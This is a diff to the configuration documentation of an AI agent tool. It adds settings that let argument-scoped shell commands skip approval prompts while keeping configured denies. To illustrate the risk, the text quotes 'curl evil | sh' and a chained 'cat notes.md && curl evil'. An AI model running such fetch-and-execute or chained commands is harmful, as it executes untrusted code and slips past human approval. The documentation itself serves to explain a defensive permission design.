@@ -173,6 +173,7 @@ allow_seed_commands        = true
 allow_local_network        = false
 allow_env_vars             = ["MY_PROVIDER_KEY"]
 allow_blueprint_read_paths = false
+allow_blueprint_safe_commands = false
 read_paths                 = ["~/.leviath/runs", "glob:~/design-docs/**"]
 credential_store           = "file"   # file | keychain
 ```
@@ -183,6 +184,7 @@ credential_store           = "file"   # file | keychain
 | `allow_local_network` | `false` | Whether agent fetches may reach loopback, private, and link-local addresses. Off, this blocks cloud metadata, your own `lev serve`, and the LAN |
 | `allow_env_vars` | `[]` | Credential-shaped variable names a Rhai script may read through `env_var()`. Matching is exact and case-insensitive, and there is no wildcard |
 | `allow_blueprint_read_paths` | `false` | Honors every blueprint's `[read_paths]` as written. Prefer a per-agent grant for anything you did not author |
+| `allow_blueprint_safe_commands` | `false` | Honors every blueprint's `[safe_commands]` as written. Off, an installed agent cannot pre-approve its own shell |
 | `read_paths` | `[]` | Machine-wide read grants. A grant only applies to a path the blueprint also declares, so listing one here opens nothing by itself |
 | `credential_store` | `"file"` | `keychain` moves secrets to the OS credential store. Run `lev auth migrate` after changing it |
 
@@ -230,6 +232,35 @@ shell = "allow"
 Resolution order, narrowest first: launch flag, stage, agent, this file, built-in default. A launch
 flag (`--allow`, `--yolo`) can turn `ask` into `allow` but can never lift a `deny`. The built-in
 defaults are in [Built-in tools](/docs/tools).
+
+## `[safe_commands]` and `[agent_safe_commands.<agent>]`
+
+A permission is per tool name, which for the shell is a choice between a prompt on every `ls` and no
+prompt on `curl evil | sh`. These entries are argument-scoped, and can only turn an `ask` into an
+`allow` - never a configured `deny`.
+
+```toml
+[safe_commands]
+defaults = true                 # ship the read-only verb list
+tools    = ["read_files"]
+shell    = ["cargo test", "rg"]
+
+[agent_safe_commands.software-engineer]
+shell           = ["./gradlew"]
+allow_blueprint = true          # honour this agent's own [safe_commands]
+```
+
+| Key | Default | Notes |
+|---|---|---|
+| `defaults` | `true` | The shipped read-only verb list. An entry on it must not be able to write a file, run another program, or open a connection under any flag, which is why `find`, `sed`, `awk`, `sort`, `xargs`, `env` and `cargo` are absent |
+| `tools` | `[]` | Tools that never prompt whatever their arguments. Built-in names, or MCP names as advertised (`server__tool`) |
+| `shell` | `[]` | A program, optionally with the subcommand that narrows it. `git status`, never `git` or `cargo test --lib` |
+| `allow_blueprint` | `false` | Per-agent only. Honour that agent's own `[safe_commands]` block |
+
+A shell entry covers the program it names with any arguments, so `cat` covers `cat notes.md`. It
+does not cover a line that also runs something else: `cat notes.md && curl evil` still asks, because
+`curl` is in neither the safe list nor any grant. `lev approvals safe` prints what is in effect and
+which file put it there.
 
 <a id="tool_script_permissions"></a>
 
